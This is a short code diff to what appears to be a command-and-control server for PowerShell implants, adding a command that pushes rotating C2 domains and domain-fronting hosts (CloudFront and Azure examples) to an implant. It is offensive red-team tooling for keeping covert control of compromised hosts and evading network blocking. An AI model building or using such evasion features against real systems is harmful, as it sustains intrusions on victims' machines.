@@ -149,6 +149,9 @@ def handle_ps_command(command, user, randomuri, implant_id):
     elif command == "sharpsocks":
         do_sharpsocks(user, command, randomuri)
         return
+    elif (command.startswith("enable-rotation")):
+        do_rotation(user, command, randomuri)
+        return
     elif command.startswith("reversedns"):
         do_reversedns(user, command, randomuri)
         return
@@ -612,6 +615,16 @@ def do_reversedns(user, command, randomuri):
     params = params.sub("", command)
     new_task("[System.Net.Dns]::GetHostEntry(\"%s\")" % params, user, randomuri)
 
+def do_rotation(user, command, randomuri):
+    domain = input("Domain or URL in array format: \"https://www.example.com\",\"https://www.example2.com\" ")
+    domainfront = input("Domain front URL in array format: \"fjdsklfjdskl.cloudfront.net\",\"jobs.azureedge.net\" ")
+    new_task("set-variable -name rotdf -value %s" % domainfront, user, randomuri)
+    new_task("set-variable -name rotate -value %s" % domain, user, randomuri)
+
+
+def do_get_rotation(user, command, randomuri):
+    new_task("get-variable -name rotdf", user, randomuri)
+    new_task("get-variable -name rotate", user, randomuri)
 
 def do_shell(user, command, randomuri):
     new_task(command, user, randomuri)
